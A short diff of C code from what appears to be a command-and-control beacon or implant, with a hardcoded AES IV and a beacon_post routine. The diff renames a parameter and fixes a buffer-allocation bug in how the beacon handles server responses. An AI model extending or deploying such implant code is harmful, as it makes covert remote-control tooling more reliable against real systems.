@@ -291,7 +291,7 @@ static BYTE aes_iv[IVSIZE] = {0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA,
 
 
 
-BOOL InstallAesEncryption (PEAS pAES)
+BOOL InstallAesEncryption (PEAS pAes)
 {
     BOOL bSTATE =TRUE;
     BCRYPT_ALG_HANDLE hAlgorithm = NULL;
@@ -1191,8 +1191,12 @@ BOOL beacon_post(
         break;
 
       // grow response buffer
-      BYTE *pTemp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pResponse,
-                                        dwRespTotal + dwBytesRead);
+      BYTE *pTemp;
+      if (pResponse == NULL)
+        pTemp = (BYTE *)HeapAlloc(GetProcessHeap(), 0, dwBytesRead);
+      else
+        pTemp = (BYTE *)HeapReAlloc(GetProcessHeap(), 0, pResponse,
+                                    dwRespTotal + dwBytesRead);
       if (!pTemp) {
         printf("[!] HeapReAlloc Failed\n");
         goto CLEANUP;
